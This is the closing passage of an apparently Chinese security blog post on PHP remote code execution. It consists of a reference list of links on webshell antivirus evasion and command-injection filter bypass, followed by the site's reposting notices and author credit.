[较全的PHP5、PHP7免杀浅谈](https://www.freebuf.com/articles/network/279563.html)

[国光的PHPWebshell免杀总结](https://www.sqlsec.com/2020/07/shell.html#toc-heading-24)

[Windows与Linux的Apache安装](https://cloud.tencent.com/developer/article/1698069)

[P神的无字母数字WebShell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list)

[P神的无字母数字Webshell续](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list)

[绕过小结](https://www.mi1k7ea.com/2019/06/30/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5Bypass%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/#0x01-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4Bypass)

[命令注入长度绕过CTF题](https://www.cnblogs.com/-chenxs/p/11981586.html)

[命令注入小结](https://www.mi1k7ea.com/2019/06/30/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5Bypass%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/)

还有一些博客在查阅资料时疏于记录，但同样给予了重大改进；在此表达真挚的感谢！

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **fi3wey** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/261910](/post/id/261910)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [RCE](/tag/RCE)
  * [PHP](/tag/PHP)

 **+1** __6赞

 __收藏

![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg) fi3wey

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

